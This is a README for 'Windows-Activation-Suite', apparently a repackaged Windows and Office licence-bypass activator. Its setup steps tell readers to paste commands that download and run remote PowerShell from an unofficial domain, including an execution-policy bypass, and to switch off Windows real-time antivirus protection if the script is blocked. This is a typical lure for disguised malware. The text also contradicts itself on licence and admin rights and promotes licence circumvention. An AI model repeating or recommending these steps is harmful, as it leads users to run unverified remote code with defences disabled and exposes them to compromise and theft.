<div align="center">

# Windows-Activation-Suite: Multi-Method Activation Toolkit for Windows 10 & 11

![preview](https://raw.githubusercontent.com/abdelrahmankhalaf86/windows-activation-suite/main/promo_094e7.svg)

[![licence](https://img.shields.io/badge/LICENCE-OFL--1.1-6366f1?style=flat-square&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/RATE-4.5%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-GREEN-2ea44f?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-5.1%2B-818cf8?style=flat-square&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility for activating Windows and Office installations through four distinct methods: HWID, Ohook, TSforge, and Online KMS. It supports Windows 7, 8, 10, 11, and Server editions alongside Office 2010 through 2021 and 365, automatically detecting the installed edition and available activation state. The suite leverages native Windows activation APIs rather than injecting DLLs or modifying core system files, keeping operations reversible and compatible with routine updates. Users can select between permanent activation via digital license or Ohook, offline activation through TSforge, or KMS-based activation, with built-in support for backup, restore, and Extended Security Updates.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Open Windows PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the install command
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

Windows-Activation-Suite provides four independent activation mechanisms, each targeting a specific product family and licensing model. The tool selects the appropriate method automatically based on the detected Windows edition and installed Office version, while still allowing manual overrides for advanced scenarios.

### Activation Methods

- **HWID** — Generates a permanent digital license bound to the device hardware for Windows 10 and Windows 11. Activation persists across reboots and does not require periodic renewal.
- **Ohook** — Provides permanent offline activation for Microsoft Office products by hooking the licensing verification layer at runtime. No background service or network dependency is required after activation.
- **TSforge** — Enables offline activation for legacy Windows versions, including Windows 7, 8, and 8.1, by writing activation data directly to the system's licensing store.
- **Online KMS** — Performs KMS-based activation for Windows and Office editions that rely on volume licensing. Handles renewal scheduling automatically where supported.

### Platform Coverage

- Windows 7, 8, and 8.1 — Home, Pro, Ultimate, Enterprise editions via TSforge or KMS.
- Windows 10 — Home, Pro, Enterprise, Education, and LTSC editions via HWID or KMS.
- Windows 11 — Home, Pro, Enterprise, Education, and IoT editions via HWID or KMS.
- Windows Server — 2016, 2019, and 2022 via KMS.
- Microsoft Office 2010 through 2021 and Office 365 — all editions via Ohook or KMS.

### Diagnostic and Utility Capabilities

- **Edition detection** — Identifies the installed Windows and Office edition to determine the compatible activation path without user input.
- **Activation status reporting** — Displays the current licensing state, remaining grace period, and active method for each detected product.
- **Method selection** — Allows explicit choice between permanent and KMS-based activation where both are applicable.
- **Backup and restore** — Captures the existing activation state before modification and restores it on demand, enabling rollback to the prior configuration.
- **Extended Security Updates** — Configures ESU enrollment for Windows 7 and Windows 10 installations where applicable.

### Operational Characteristics

- Uses native Windows activation APIs and does not inject DLLs into system processes.
- Does not modify core system files; all changes are confined to the licensing store and are reversible through the restore function.
- Operates fully offline after the initial execution, with no telemetry or outbound reporting.
- Open-source codebase, auditable in full, with regular maintenance against cumulative Windows updates.

## How it works

Windows-Activation-Suite operates entirely through native Windows activation interfaces, orchestrating multiple activation backends behind a single unified command-line and menu-driven front end. On launch, the suite performs environment discovery: it reads the installed Windows edition and build number from the registry and WMI, enumerates installed Office products and their channel information, and determines which activation methods are applicable to the detected configuration. This detection layer prevents incompatible method selection and surfaces the recommended path for the current system.

Each activation method is implemented as an isolated module with a defined contract:

- **HWID** — Generates a hardware-bound digital license by constructing a valid product key ticket from the device's hardware fingerprint and submitting it through the modern activation client. The resulting license is stored by Windows and persists across reboots, tied to the machine's hardware signature rather than a remote licensing server.
- **Ohook** — Installs a local licensing hook that intercepts Office license validation calls at the library level, returning valid license state to the Office client. No network communication is required after setup, and the hook is reversible through the suite's restore routine.
- **TSforge** — Targets legacy activation stores on older Windows releases, writing activation tokens directly into the system's token repository and refreshing the associated licensing state. This path is designed for platforms where modern activation clients are unavailable or unsupported.
- **Online KMS** — Configures the system's KMS client to point at a reachable KMS endpoint, installs the appropriate generic volume license key for the detected edition, and triggers activation through the standard slmgr interface. Renewal tasks are registered where periodic reactivation is required.

All modules share a common execution pipeline: preflight validation, method-specific activation, post-activation verification via the system's licensing query APIs, and structured result reporting. The suite records the prior activation state before making changes, enabling the restore function to roll back to the original configuration. No core system binaries are patched; all operations are confined to activation stores, registry licensing keys, and client configuration, which keeps the tooling reversible and compatible with standard servicing updates.

Execution requires administrative privileges, as the underlying activation APIs are restricted to elevated contexts. The suite exposes verbose logging for each stage, and every method returns a deterministic exit status so that scripted deployments can branch on success or failure without parsing console output.

## Compatibility

Windows-Activation-Suite is engineered to operate across a broad matrix of Microsoft platforms, leveraging method-specific activation pathways that align with each operating system's licensing architecture.

**Windows Client Support**

- **Windows 7** (Home, Professional, Ultimate, Enterprise) — valid through TSforge and Online KMS activation paths.
- **Windows 8 / 8.1** (Core, Pro, Enterprise) — supported via TSforge and Online KMS.
- **Windows 10** (Home, Pro, Enterprise, Education, LTSC) — HWID delivers a permanent digital license; Online KMS serves as a fallback for KMS-eligible editions.
- **Windows 11** (Home, Pro, Enterprise, Education, IoT) — HWID-based permanent digital licensing, with Online KMS available for volume editions.

**Windows Server Support**

- **Windows Server 2016, 2019, and 2022** — activated through the Online KMS pathway, with edition detection handled automatically by the suite.

**Microsoft Office Support**

- **Office 2010 through 2021** (all editions) — Ohook provides permanent activation; Online KMS is available as an alternative.
- **Office 365** (subscription) — Ohook-based activation.

**Method-to-Platform Alignment**

| Platform Family | Primary Method | Alternate Method |
|---|---|---|
| Windows 10 / 11 | HWID (permanent digital license) | Online KMS |
| Windows 7 / 8 / 8.1 | TSforge | Online KMS |
| Windows Server 2016–2022 | Online KMS | — |
| Office 2010–2021 | Ohook | Online KMS |
| Office 365 | Ohook | — |

**Operational Requirements**

- Activation is performed through native Windows activation APIs; no DLL injection or core system file modification is involved.
- Administrative privileges are required to execute activation routines.
- Edition detection is automatic, ensuring the correct activation pathway is selected without manual configuration.
- Once activated, the resulting license state persists offline.
- Major Windows feature updates may require re-execution of the activation routine; minor cumulative updates generally do not affect the activated state.

**Compatibility Notes**

- HWID activation binds the digital license to the hardware fingerprint and survives reinstallation on the same device.
- TSforge is designed for offline activation scenarios on legacy Windows releases.
- Ohook targets Office licensing at the component level and remains stable across Office updates.
- Online KMS activation is subject to periodic renewal cycles inherent to the KMS protocol.

## FAQ

**Q: Which activation method should I choose for my edition of Windows?**

A: Method selection depends on the target platform. Windows 10 and 11 (including LTSC, IoT, and Server variants) are best served by HWID, which provisions a permanent digital license bound to the hardware fingerprint. Windows 7, 8, and 8.1 use TSforge for offline activation or Online KMS where a KMS infrastructure is available. Office 2010 through 2021 and 365 use Ohook for permanent activation. Online KMS remains available as a fallback for Windows and Office products that require periodic renewal.

**Q: How does HWID activation differ from KMS activation?**

A: HWID generates a hardware-bound digital license that persists across reboots and does not require periodic renewal or network contact after initial provisioning. KMS activation relies on a key management service and requires re-activation at the end of each KMS cycle (typically 180 days). HWID is recommended for Windows 10/11; Online KMS is appropriate for products and platforms where HWID is not applicable.

**Q: Is the activation permanent?**

A: HWID and Ohook produce permanent activation for their respective targets. TSforge provides offline activation for legacy Windows versions. Online KMS activation is periodic by design and requires re-execution when the KMS validity window expires. Permanent methods remain active across minor updates; major feature updates or in-place upgrades may require re-running the tool.

**Q: Does the suite require an internet connection?**

A: Initial activation for HWID, Ohook, and Online KMS requires network access to reach the activation service. TSforge operates fully offline. Once activation completes, HWID and Ohook remain valid without further connectivity. If DNS filtering blocks the activation endpoint, enable DNS-over-HTTPS at the browser or system level to restore access.

**Q: Will Windows updates or feature upgrades break activation?**

A: Minor cumulative updates do not affect activation state. Major feature updates, in-place upgrades, or edition changes can invalidate a digital license or reset KMS state. Re-run the suite after such events; the edition detection and activation status modules report the current state before any change is applied.

**Q: Can the suite be used on domain-joined or managed systems?**

A: The suite operates through native Windows activation APIs and does not inject DLLs or modify core system files. However, managed environments may enforce activation policy through Group Policy or enterprise KMS. Confirm organizational policy before use; the suite does not override enterprise licensing infrastructure.

**Q: How do I verify activation status after running the suite?**

A: The activation status module queries the current licensing state through native Windows APIs and reports whether the installation is permanently activated, KMS-activated, or unlicensed. Use the backup and restore utilities to capture the activation state before system changes and reapply it afterward if needed.

**Q: How is activation removed or reverted?**

A: The suite includes restore and uninstall options that revert activation changes and return the system to its prior licensing state. Backup support allows the previous activation state to be saved and restored. No residual system file modifications are left behind because the tool does not alter core system files.

**Q: Is the source code auditable?**

A: Yes. The project is open source under the MIT License, and the full source is included in the repository. The implementation relies on native Windows activation APIs without DLL injection or core system file modification, so behavior can be reviewed directly in the published scripts.

**Q: What is the relationship to the original Microsoft Activation Scripts project?**

A: Windows-Activation-Suite is based on the open-source Microsoft Activation Scripts project. Credit for the original implementation belongs to its developers. This suite extends the original with the outlined feature set and compatibility matrix while preserving the upstream activation methodology.

## Disclaimer

This software is provided strictly for educational, research, and interoperability purposes. Windows-Activation-Suite is an open-source implementation that interacts with native Windows activation components and Microsoft Office licensing interfaces. It is distributed in the hope that it will be useful for studying activation mechanisms, validating licensing behavior in controlled environments, and testing system configurations.

The authors and contributors of Windows-Activation-Suite make no representations or warranties, express or implied, regarding the legality, safety, reliability, or fitness for any particular purpose of this software. Activation of unlicensed software may violate the Microsoft Terms of Service and applicable local laws. You are solely responsible for ensuring that your use of this software complies with all applicable license agreements, terms of service, and legal requirements in your jurisdiction.

By downloading, compiling, or executing any part of Windows-Activation-Suite, you acknowledge that you assume full responsibility for any consequences arising from its use, including but not limited to system instability, data loss, voided warranties, or breach of third-party agreements. The maintainers disclaim all liability for any direct, indirect, incidental, special, or consequential damages resulting from the use or inability to use this software.

Windows-Activation-Suite is intended to be executed only on systems you own or are explicitly authorized to administer. Do not deploy this software on machines belonging to employers, educational institutions, or third parties without documented permission. The activation methods implemented in this project, including HWID, Ohook, TSforge, and Online KMS, operate by design against licensing enforcement mechanisms; their behavior may change without notice as operating system and application updates are released.

No support, guarantee of continued functionality, or commitment to update is provided. The project is maintained on a best-effort basis, and features may be modified or removed at any time. Verify the integrity of any distributed build against the source in this repository before execution, and be aware that third parties may redistribute modified versions under the same name. Only builds obtained directly from this project's official distribution channels should be considered representative of the source code.

This disclaimer is subject to change without prior notice. Continued use of Windows-Activation-Suite after any revision constitutes acceptance of the updated terms.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants full access to the source code with minimal restrictions. Under its terms, you may use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software. The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

This licensing model supports the project's feature-driven development approach: the activation engine, including the HWID, Ohook, TSforge, and Online KMS method implementations, remains fully auditable. Because the source is open, users and contributors can inspect exactly how each activation path interacts with native Windows activation APIs, verify that no core system files are modified, and confirm that activation state remains reversible through the built-in backup and restore functionality. Derivative works and forks are permitted under the same terms, encouraging compatibility testing across the supported Windows 7, 8, 8.1, 10, 11, and Server platforms, as well as Office 2010 through 2021 and 365.

The complete license text, including the copyright notice and permission grant, is contained in the LICENSE file at the root of the repository. In the event of any conflict between this summary and the LICENSE file, the LICENSE file governs. Windows-Activation-Suite builds upon the open-source Microsoft Activation Scripts project; attribution to the original developers is retained in accordance with the license terms. Use of this software remains subject to the disclaimer described elsewhere in this document.